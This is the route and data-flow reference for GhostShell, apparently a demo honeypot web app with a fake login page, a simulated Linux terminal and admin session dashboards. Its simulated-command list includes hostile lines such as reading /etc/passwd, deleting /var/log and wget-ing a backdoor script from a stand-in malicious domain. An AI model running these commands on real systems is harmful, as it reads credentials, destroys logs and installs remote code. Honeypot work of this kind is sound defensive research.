# GhostShell - Route Map & API Overview

## 🗺️ Application Routes

### Public Routes

#### **Home / Authentication Interface**
```
Route: GET /
File:  app/page.tsx
Features:
  - CorpSecure branding
  - Login form tab
  - Console access tab
  - Admin panel link
  - Security notice footer
```

#### **Honeypot Terminal**
```
Route: GET /terminal
File:  app/terminal/page.tsx
Features:
  - Fake Linux shell
  - Command execution (simulated)
  - Command history (arrow keys)
  - Pre-configured command responses
  - Session ID display
  - "Monitoring Active" indicator
  - Admin panel link
```

### Admin Routes

#### **Dashboard Overview**
```
Route: GET /admin
File:  app/admin/page.tsx
Features:
  - Metric cards (Attackers, Active, Commands, Risk)
  - Risk distribution pie chart
  - 24-hour attack timeline
  - Threat classification breakdown
  - Quick action links
```

#### **Live Sessions List**
```
Route: GET /admin/sessions
File:  app/admin/sessions/page.tsx
Features:
  - All sessions in card format
  - Color-coded threat levels
  - Session metrics summary
  - Behavior tags
  - Recent commands preview
  - Clickable for details
```

#### **Session Details**
```
Route: GET /admin/sessions/[sessionId]
File:  app/admin/sessions/[sessionId]/page.tsx
Examples:
  - /admin/sessions/session-001
  - /admin/sessions/session-002
  - /admin/sessions/session-003
  - /admin/sessions/session-004
Features:
  - Risk score display
  - Duration and command count
  - Risk progression chart
  - Command transcript with details
  - Behavior classification tags
  - Deception strategies used
  - Session timeline
```

---

## 📊 Data Flow

```
app/
├── page.tsx
│   └── State: [activeTab, username, password, consoleInput]
│   └── Actions: Login/Console redirect to /terminal
│
├── terminal/page.tsx
│   └── State: [sessionId, commandHistory, currentInput]
│   └── Commands: Simulated responses from commandResponses object
│   └── Links to: /admin
│
└── admin/
    ├── page.tsx
    │   └── Data: getSessionMetrics() from lib/mock-data
    │   └── Charts: Risk distribution, attack timeline
    │   └── Links to: /admin/sessions
    │
    └── sessions/
        ├── page.tsx
        │   └── Data: mockSessions from lib/mock-data
        │   └── Display: Session cards with color coding
        │   └── Links to: /admin/sessions/[sessionId]
        │
        └── [sessionId]/page.tsx
            └── Data: getSessionById(id) from lib/mock-data
            └── Display: Full attack details
            └── Charts: Risk progression
            └── Links to: /admin/sessions
```

---

## 🔄 Query Parameters & State

### URL Parameters
```
/admin/sessions/[sessionId]
  - sessionId: string (required)
  - Examples: "session-001", "session-002", etc.
```

### Client-Side State

#### Home Page (`/`)
```javascript
{
  activeTab: 'login' | 'console'
  username: string
  password: string
  consoleInput: string
}
```

#### Terminal Page (`/terminal`)
```javascript
{
  sessionId: string                          // Generated: session-XXXXXXXXX
  commandHistory: Array<{
    input: string
    output: string
  }>
  currentInput: string
  commandIndex: number                        // For history navigation
}
```

---

## 📡 Data Sources

### Mock Data (`lib/mock-data.ts`)

#### Exported Functions
```typescript
mockSessions: HoneypotSession[]
  - 4 pre-configured sessions

getSessionMetrics(): SessionMetrics
  - Aggregated metrics from all sessions

getSessionById(id: string): HoneypotSession | undefined
  - Fetch single session

getThreatColor(threat: string): string
  - Color mapping for threat levels

getThreatBgColor(threat: string): string
  - Background color mapping

formatDuration(start: number, end: number): string
  - Format milliseconds to human-readable duration

formatTime(timestamp: number): string
  - Format timestamp to HH:MM:SS
```

### Command Responses (`app/terminal/page.tsx`)
```javascript
commandResponses: Record<string, string> = {
  'ls': '...',
  'whoami': '...',
  'id': '...',
  'pwd': '...',
  'sudo su': '...',
  'sudo -l': '...',
  'cat /etc/passwd': '...',
  'nmap -sV localhost': '...',
  'curl http://internal-api:8080/secrets': '...',
  'ps aux': '...',
  'rm -rf /var/log': '...',
  'wget http://malicious-domain.com/backdoor.sh': '...',
  'help': '...',
  'clear': '',
}
```

---

## 🎯 Event Handlers

### Home Page
```typescript
handleLogin(e): void
  - Redirects to /terminal on form submit

handleConsoleAccess(e): void
  - Detects console bypass
  - Redirects to /terminal
```

### Terminal Page
```typescript
handleCommand(e): void
  - On Enter: Execute command (simulated)
  - On ArrowUp: Previous command in history
  - On ArrowDown: Next command in history
  - Clears screen on 'clear' command
```

### Admin Pages
```typescript
Links to navigate between:
  - /admin → /admin/sessions
  - /admin/sessions → /admin/sessions/[sessionId]
  - Any page → /admin or /
```

---

## 💾 Type Definitions (`lib/types.ts`)

```typescript
interface TerminalCommand {
  id: string
  timestamp: number
  command: string
  output: string
  threat: ThreatType
  riskIncrease: number
}

interface HoneypotSession {
  id: string
  startTime: number
  lastActivity: number
  riskScore: number
  entryVector: EntryVector
  attackStage: AttackStage
  isActive: boolean
  commands: TerminalCommand[]
  threatLevel: ThreatLevel
  behaviorTags: string[]
  deceptionStrategies: string[]
}

interface SessionMetrics {
  totalSessions: number
  activeSessions: number
  totalCommands: number
  averageRiskScore: number
  threatDistribution: {
    reconnaissance: number
    credentialAccess: number
    privilegeEscalation: number
    persistence: number
    destructive: number
  }
}

// Type Aliases
type ThreatType = 'reconnaissance' | 'credential-access' | 'privilege-escalation' | 'persistence' | 'destructive' | 'normal'
type EntryVector = 'console' | 'api' | 'debug' | 'direct'
type AttackStage = 'initial-access' | 'reconnaissance' | 'escalation' | 'exploitation' | 'persistence'
type ThreatLevel = 'low' | 'medium' | 'high' | 'critical'
```

---

## 🎨 UI Components Breakdown

### Home Page Components
- Navigation tabs (Login / Console Access)
- Form inputs
- Buttons
- Card layouts
- Security notice banner

### Terminal Components
- Header (session info, monitoring badge)
- Terminal output area (scrollable)
- Command input line
- Footer (help text)

### Dashboard Components
- Metric cards (4)
- Pie chart (Recharts)
- Line chart (Recharts)
- Statistics grid
- Action cards

### Sessions List Components
- Session cards (hover effects)
- Risk badges
- Status indicators (pulsing animation)
- Tag pills
- Clickable rows

### Session Details Components
- Header with risk display
- Info cards
- Line chart
- Tag sections
- Command transcript (scrollable)
- Timeline with milestones

---

## 🔗 Navigation Flow

```
/ (Home)
├── Login → /terminal
└── Console Access → /terminal

/terminal (Honeypot)
├── Click "Admin Panel" → /admin
├── Click Logo → /
└── Click Logout → /

/admin (Dashboard)
├── Click "Live Sessions" → /admin/sessions
├── Click "Logout" → /
└── Links in Dashboard → Quick reference

/admin/sessions (Live Monitor)
├── Click session card → /admin/sessions/[sessionId]
├── Click "Dashboard" → /admin
└── Click "Logout" → /

/admin/sessions/[sessionId] (Details)
├── Click "Back" → /admin/sessions
├── Click "Dashboard" → /admin
└── Click "Logout" → /
```

---

## 📈 API-Like Data Access

While not true REST APIs, these functions act as data interfaces:

```typescript
// Get aggregated metrics
const metrics = getSessionMetrics()
// Returns: {
//   totalSessions: 4,
//   activeSessions: 3,
//   totalCommands: 19,
//   averageRiskScore: 70.5,
//   threatDistribution: {...}
// }

// Get specific session
const session = getSessionById('session-001')
// Returns: HoneypotSession | undefined

// Get color for display
const color = getThreatColor('high')
// Returns: 'text-orange-600'

// Format values
const duration = formatDuration(startTime, endTime)
// Returns: '15m 23s'

const time = formatTime(timestamp)
// Returns: '14:30:45'
```

---

## 🔐 No Authentication Required

- All routes are public
- No login needed for admin
- No authentication state management
- No database
- Everything is client-side + mock data

---

## ⚡ Performance Notes

- Page loads instantly (no API calls)
- All data is in memory
- No database queries
- Charts render quickly (Recharts)
- Responsive animations smooth
- Terminal input real-time

---

## 📱 Responsive Breakpoints

```
Desktop: 1024px+
  - Full grid layouts
  - Side-by-side charts
  - Multi-column cards

Tablet: 768px - 1023px
  - 2-column grids
  - Stacked charts
  - Responsive padding

Mobile: < 768px
  - Single column
  - Stacked layouts
  - Touch-friendly buttons
```

---

## 🔄 Environment Setup

```
Node.js: 16+
npm: 8+
next: 16.1.3

Development:
  npm run dev        → Turbopack dev server on :3000

Production:
  npm run build      → Optimized build
  npm start          → Production server on :3000
```

---

**Complete Route & Data Architecture for GhostShell**
*Reference this for understanding the full information flow*
